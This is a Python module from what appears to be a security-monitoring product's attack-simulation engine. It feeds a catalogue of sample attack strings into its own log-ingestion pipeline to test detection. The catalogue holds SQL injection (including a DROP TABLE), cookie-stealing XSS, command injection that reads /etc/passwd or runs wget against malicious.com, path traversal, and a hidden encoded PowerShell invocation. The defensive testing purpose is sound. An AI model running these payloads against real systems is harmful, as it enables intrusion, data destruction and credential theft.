import re
import uuid
import logging
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple
from app.database import get_db_connection

logger = logging.getLogger("aegis-simulation-engine")

# --- Attack Catalog Configuration ---
ATTACK_CATALOG = {
    "SQL_INJECTION": {
        "name": "SQL Injection (SQLi)",
        "description": "Exploiting vulnerable input parameters to execute arbitrary database queries.",
        "severity": "CRITICAL",
        "mitre": "T1190 - Exploit Public-Facing Application",
        "rule": "SQL signature heuristics",
        "payloads": ["' OR 1=1 --", "'; DROP TABLE \"ThreatEvent\";--", "admin' --", "1' UNION SELECT NULL, username, password FROM users--"],
        "source_ip": "198.51.100.15",
        "target": "Aegis Customer Portal"
    },
    "XSS": {
        "name": "Cross Site Scripting (XSS)",
        "description": "Injecting malicious client-side scripts to run in other users' browsers.",
        "severity": "HIGH",
        "mitre": "T1059 - Command and Scripting Interpreter",
        "rule": "XSS script match rules",
        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert('xss')>", "javascript:alert(document.cookie)"],
        "source_ip": "198.51.100.22",
        "target": "Aegis API gateway"
    },
    "COMMAND_INJECTION": {
        "name": "Command Injection",
        "description": "Executing arbitrary OS commands on the host server.",
        "severity": "CRITICAL",
        "mitre": "T1203 - Exploitation for Client Execution",
        "rule": "OS execution commands",
        "payloads": ["; cat /etc/passwd", "| wget http://malicious.com/malware", "; whoami && id"],
        "source_ip": "203.0.113.88",
        "target": "Internal File Server"
    },
    "DIRECTORY_TRAVERSAL": {
        "name": "Directory Traversal",
        "description": "Accessing restricted files outside the application web root.",
        "severity": "HIGH",
        "mitre": "T1083 - File and Directory Discovery",
        "rule": "Path traversal heuristics",
        "payloads": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd"],
        "source_ip": "198.51.100.41",
        "target": "Documentation Web Server"
    },
    "BRUTE_FORCE": {
        "name": "Web Authentication Brute Force",
        "description": "Rapidly submitting multiple login requests with different credentials.",
        "severity": "HIGH",
        "mitre": "T1110 - Brute Force",
        "rule": "Volumetric failed credentials",
        "payloads": [
            "Failed login attempt for user admin - Invalid password",
            "Failed login attempt for user root - Invalid password",
            "Failed login attempt for user security - Invalid password",
            "Failed login attempt for user service - Invalid password",
            "Failed login attempt for user admin - Invalid password"
        ],
        "source_ip": "203.0.113.111",
        "target": "Customer SSO Portal"
    },
    "SSH_BRUTE_FORCE": {
        "name": "SSH Brute Force",
        "description": "Targeting SSH port 22 with automated password guessing.",
        "severity": "HIGH",
        "mitre": "T1110.001 - Password Guessing",
        "rule": "Port 22 SSH audit anomalies",
        "payloads": [
            "sshd[12345]: Invalid user admin from 198.51.100.12",
            "sshd[12345]: Connection closed by authenticating user admin 198.51.100.12",
            "sshd[12346]: Invalid user root from 198.51.100.12",
            "sshd[12346]: Connection closed by authenticating user root 198.51.100.12"
        ],
        "source_ip": "198.51.100.12",
        "target": "Edge SSH gateway"
    },
    "DDOS": {
        "name": "Distributed Denial of Service (DDoS)",
        "description": "Overwhelming the target system with volumetric traffic to cause outages.",
        "severity": "HIGH",
        "mitre": "T1498 - Network Denial of Service",
        "rule": "Volumetric rate spikes",
        "payloads": [
            "Volumetric request spike - 10000 req/sec from single block",
            "Border gateway rate limit triggered - blocking IP 185.220.101.4",
            "DDoS mitigation path engaged"
        ],
        "source_ip": "185.220.101.4",
        "target": "Core CDN Gateways"
    },
    "MALICIOUS_FILE_UPLOAD": {
        "name": "Malicious File Upload",
        "description": "Uploading scripts with executable extensions to execute code on server.",
        "severity": "CRITICAL",
        "mitre": "T1505.003 - Web Shell",
        "rule": "Double extension uploads",
        "payloads": ["Uploaded shell.pdf.php - execution parameters present", "File type mismatch: payload contains executable shell scripts"],
        "source_ip": "203.0.113.44",
        "target": "Customer File Upload Portal"
    },
    "PRIVILEGE_ESCALATION": {
        "name": "Privilege Escalation",
        "description": "Exploiting system bugs to gain root or administrator level rights.",
        "severity": "CRITICAL",
        "mitre": "T1068 - Exploitation for Privilege Escalation",
        "rule": "Privileged shell spawns",
        "payloads": ["sudoers file modified - user apache added to superusers", "Local exploit run: setuid execution payload matched"],
        "source_ip": "198.51.100.5",
        "target": "Production DB Server"
    },
    "SUSPICIOUS_POWERSHELL": {
        "name": "Suspicious PowerShell Activity",
        "description": "Executing obfuscated or restricted PowerShell commands.",
        "severity": "HIGH",
        "mitre": "T1059.001 - PowerShell",
        "rule": "Obfuscated shell invocation",
        "payloads": ["powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aGVsbG8="],
        "source_ip": "203.0.113.99",
        "target": "Windows Domain Controller"
    }
}

# --- Simulation Execution Engine ---
def run_attack_simulation(organization_id: str, attack_type: str) -> Dict[str, Any]:
    attack_meta = ATTACK_CATALOG.get(attack_type.upper())
    if not attack_meta:
        raise ValueError(f"Attack type '{attack_type}' is not supported in the Attack Catalog.")

    conn = get_db_connection()
    try:
        with conn.cursor() as cursor:
            # 1. Initialize SimulationRun with "Running" status
            run_id = str(uuid.uuid4())
            started_at = datetime.utcnow()
            cursor.execute(
                'INSERT INTO "SimulationRun" (id, "organizationId", "attackType", severity, status, "eventsGenerated", "incidentsGenerated", "startedAt") '
                'VALUES (%s, %s, %s, %s, %s, %s, %s, %s)',
                (run_id, organization_id, attack_type, attack_meta["severity"], "Running", 0, 0, started_at)
            )
            conn.commit()

            # 2. Get or create LogSource API key for the organization
            cursor.execute('SELECT "apiKey" FROM "LogSource" WHERE "organizationId" = %s LIMIT 1', (organization_id,))
            row = cursor.fetchone()
            if row:
                api_key = row[0]
            else:
                api_key = f"ls_key_sim_{uuid.uuid4().hex[:6]}"
                cursor.execute(
                    'INSERT INTO "LogSource" (id, "organizationId", name, "apiKey", "createdAt") VALUES (%s, %s, %s, %s, NOW())',
                    (str(uuid.uuid4()), organization_id, "Simulation Engine", api_key)
                )
                conn.commit()

    except Exception as e:
        logger.error(f"Failed to initialize simulation run: {e}")
        raise e
    finally:
        conn.close()

    events_count = 0
    incidents_count = 0
    
    # 3. Import and execute process_threat_log for each payload (ingestion portal simulation)
    from app.services.threat_service import process_threat_log

    for payload in attack_meta["payloads"]:
        try:
            res = process_threat_log(
                source="Simulation Engine",
                ip=attack_meta["source_ip"],
                message=payload,
                api_key=api_key, is_simulated=True
            )
            events_count += 1
            if res.get("incident_created"):
                incidents_count += 1
        except Exception as ingest_err:
            logger.error(f"Simulation payload ingestion failed: {ingest_err}")

    # 4. Finalize SimulationRun status
    conn = get_db_connection()
    try:
        with conn.cursor() as cursor:
            completed_at = datetime.utcnow()
            cursor.execute(
                'UPDATE "SimulationRun" SET status = %s, "eventsGenerated" = %s, "incidentsGenerated" = %s, "completedAt" = %s WHERE id = %s',
                ("Completed", events_count, incidents_count, completed_at, run_id)
            )
            conn.commit()

            # Fetch final run object
            cursor.execute('SELECT id, "attackType", severity, status, "eventsGenerated", "incidentsGenerated", "startedAt", "completedAt" FROM "SimulationRun" WHERE id = %s', (run_id,))
            run_row = cursor.fetchone()
            
            return {
                "id": run_row[0],
                "attackType": run_row[1],
                "severity": run_row[2],
                "status": run_row[3],
                "eventsGenerated": run_row[4],
                "incidentsGenerated": run_row[5],
                "startedAt": run_row[6].isoformat(),
                "completedAt": run_row[7].isoformat() if run_row[7] else None
            }
    except Exception as e:
        logger.error(f"Failed to finalize simulation run status: {e}")
        raise e
    finally:
        conn.close()

# --- Fetch runs history ---
def get_simulation_runs(organization_id: str, limit: int = 50) -> List[Dict[str, Any]]:
    conn = get_db_connection()
    try:
        with conn.cursor() as cursor:
            cursor.execute(
                'SELECT id, "attackType", severity, status, "eventsGenerated", "incidentsGenerated", "startedAt", "completedAt" '
                'FROM "SimulationRun" WHERE "organizationId" = %s ORDER BY "startedAt" DESC LIMIT %s',
                (organization_id, limit)
            )
            rows = cursor.fetchall()
            runs = []
            for r in rows:
                runs.append({
                    "id": r[0],
                    "attackType": r[1],
                    "severity": r[2],
                    "status": r[3],
                    "eventsGenerated": r[4],
                    "incidentsGenerated": r[5],
                    "startedAt": r[6].isoformat() if r[6] else None,
                    "completedAt": r[7].isoformat() if r[7] else None
                })
            return runs
    except Exception as e:
        logger.error(f"Failed to fetch simulation runs: {e}")
        return []
    finally:
        conn.close()
